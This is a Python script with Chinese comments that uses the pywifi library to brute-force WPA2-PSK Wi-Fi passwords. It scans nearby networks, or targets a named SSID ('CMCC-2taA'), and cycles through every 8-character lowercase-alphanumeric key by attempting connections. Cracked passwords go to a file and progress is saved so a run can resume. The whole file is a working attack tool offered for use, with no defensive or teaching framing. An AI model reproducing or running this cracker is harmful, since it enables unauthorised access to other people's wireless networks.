import json
import time
import pywifi
from pywifi import const

class Crack(object):

    def __init__(self, alist, digit = 8, dictRange = '0123456789abcdefghijklmnopqrstuvwxyz'):
        # wifi密码的范围区间
        self.dictRange = dictRange
        # wifi密码的长度
        self.digit = digit
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 抓取第一个网卡
        self.iface = wifi.interfaces()[0]
        # 初始化待破解wifi列表
        self.alist = alist or self.initialssidnamelist()
        # 测试是否处于断开状态
        if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE] :
        	# 测试连接时断开所有的链接
        	self.iface.disconnect()
        	time.sleep(1)

    def bies(self):
        # 扫描
        self.iface.scan()
        # 获取扫描结果
        bessis = self.iface.scan_results()
        alist = []
        for data in bessis:
            alist.append((data.ssid, data.signal))
        # 按信号强度排序
        return len(alist), sorted(alist, key=lambda st: st[1], reverse=True)

    def getsignal(self):
        while True:
            # 获取所有的wifi
            n, data = self.bies()
            time.sleep(1)
            if n != 0:
                # 如果数量不为0，返回前10个信号最好的
                return data[0:10]

    def initialssidnamelist(self):
        ssidlist = self.getsignal()
        namelist = []
        # 获取前10个wifi的名称
        for item in ssidlist:
            print(item[0])
            namelist.append(item[0])
        return namelist

    def readPassword(self, ssidname, myStr):
        # 测试wifi名和密码是否匹配
        bool1 = self.test_connect(myStr, ssidname)
        if len(myStr) < 8:
            return False
        if bool1:
            # 保存密码和wifi名到文件中
            save_password_to_file(myStr, ssidname)
            print('密码正确: ' + ssidname + ' ' + myStr)
            return True
        else:
            print('密码错误: ' + ssidname + ' ' + myStr)
            return False

    def test_connect(self, findStr, ssidname):
        """
        测试连接
        :param findStr: 密码
        :param ssidname: wifi名
        """
        # 创建wifi链接文件
        profile = pywifi.Profile()
        #  wifi名称
        profile.ssid = ssidname
        # 开放网卡
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = findStr
        # 设置新的链接文件
        tmp_profile = self.iface.add_network_profile(profile)
        # 连接
        self.iface.connect(tmp_profile)
        time.sleep(1)
        # 判断是否已经连接上
        if self.iface.status() == const.IFACE_CONNECTED:
            isOk = True
        else:
            isOk = False
        self.iface.disconnect()
        #time.sleep(1)
        # 检查断开状态
        #assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        if not isOk:
        	# 删除所有的wifi文件
        	#self.iface.remove_all_network_profiles()
        	self.iface.remove_network_profile(profile)

        return isOk

    def increasing_dict_index(self, dictIndexList):
        for i in range(len(dictIndexList)):
            if dictIndexList[i] < (len(self.dictRange) - 1):
                dictIndexList[i] = dictIndexList[i] + 1
                break
            else:
                dictIndexList[i] = 0
                if i == (self.digit - 1):
                    return True
    				

    def run(self):
    	# 读取破解的进度
        dictIndexList = fileRead('dictIndexList.txt', 'r+')
        if not dictIndexList:
            dictIndexList = [0] * self.digit
        else:
            dictIndexList = json.loads(dictIndexList)
    	# 开始暴力破解
        for ssidname in self.alist:
            isFounded = False
            while not isFounded:
                dictList = list(map(lambda index : self.dictRange[index], dictIndexList))
                ret = self.readPassword(ssidname, ''.join(dictList))
                isFinish = self.increasing_dict_index(dictIndexList)
                self.dictIndexList = dictIndexList.copy()
                if ret or isFinish:
                    isFounded = True
                    dictIndexList = [0] * self.digit

    def __del__(self):
        if self.dictIndexList:
            fileWrite('dictIndexList.txt', 'w+', str(self.dictIndexList) + '\n')
        print('finish crack!')


def save_password_to_file(dict, ssidname):
    fileWrite('password.txt', 'a+', str(ssidname) + '-->' +  str(dict))


def fileWrite(path, mode, content):
    fp = open(path, mode)
    fp.write(content)
    fp.close()


def fileRead(path, mode):
    fp = open(path, mode)
    content = fp.read()
    fp.close()
    return content


def main():
    crack = Crack(['CMCC-2taA'])
    startTime = time.time()
    crack.run()
    endTime = time.time()
    print('一共花费了：' + str(endTime - startTime) + '秒')  


if __name__ == '__main__':
    main()